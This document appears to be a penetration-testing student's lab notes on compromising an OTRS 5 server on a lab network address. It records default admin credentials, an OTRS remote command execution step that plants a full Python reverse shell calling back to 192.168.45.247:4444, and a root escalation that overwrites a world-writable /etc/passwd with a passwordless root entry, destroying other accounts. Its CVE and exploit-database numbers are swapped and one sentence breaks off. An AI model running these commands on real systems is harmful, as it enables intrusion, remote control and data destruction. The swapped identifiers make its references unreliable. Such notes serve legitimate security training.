# Summary
# Location
- IP Address: 10.11.1.39
## System Information
- OS: CentOS
- Kernal:
- Hostname: 
- DomainName: 
- Domain Sid: 
- DNS: 
## Vulnerabilities & Attack Vectors
- Exploit 1
- Exploit 2
- Exploit 3
## Post Exploitation
- Proof
## Credentials
### OTRS5
- uri: http://10.11.1.39/otrs/index.pl?
- username:root@localhost
- password:otrs

## System Setup
- ICMP: Enalbed/Disabled
- Firewall: Enabled/Disabled. Will respond to ICMP?
- Essential Services: XXX (TCP XXX)
- Platform:

## Notes

# Service Enumeration
## Port Scan (Nmap)

## Key Infomation
The Nmap version scan identifies an interesting potential entrypoint, in this case, we should focus on th

Nginx 1.6.3


http://10.11.1.39/otrs/index.pl

Find ORTS 5

google default credentials: root@localhost:root

/otrs-web/skins/Agent/default/css/thirdparty/ui-theme/jquery-ui.css

# Exploitation
## Exploit 1
- Title: OTRS 5.0.x/6.0.x - Remote Command Execution
- CVE: 43856
- EBD-ID: 2017-16921
- Link: https://www.exploit-db.com/exploits/43853

5. Manipulate form parameters and use "Update" button to save:

"PGP"
-Default: No
-New: Yes

"PGP::Bin"
-Default: /usr/bin/gpg 
-New: <shell command including executables the webserver user has execute permissions for, no options>
-PoC (Reverse Python Shell): /usr/bin/python

"PGP::Options"
-Default: --homedir /opt/otrs/.gnupg/ --batch --no-tty --yes
-New: <any command options>
-PoC (Reverse Python Shell): -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.247",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

## Exploit 2
privilege escalation
```
sh-4.2$ find / -perm 777 -type f 2>/dev/null
find / -perm 777 -type f 2>/dev/null
/etc/passwd
sh-4.2$ echo root::0:0:root:/root:/bin/bash > /etc/passwd
echo root::0:0:root:/root:/bin/bash > /etc/passwd
sh-4.2$ sudo root
sudo root
sudo: unknown uid 48: who are you?
sh-4.2$ su root
su root
whoami
root
```

find the /etc/passwd file can be write. so just rewrite the root and su root

get the proof


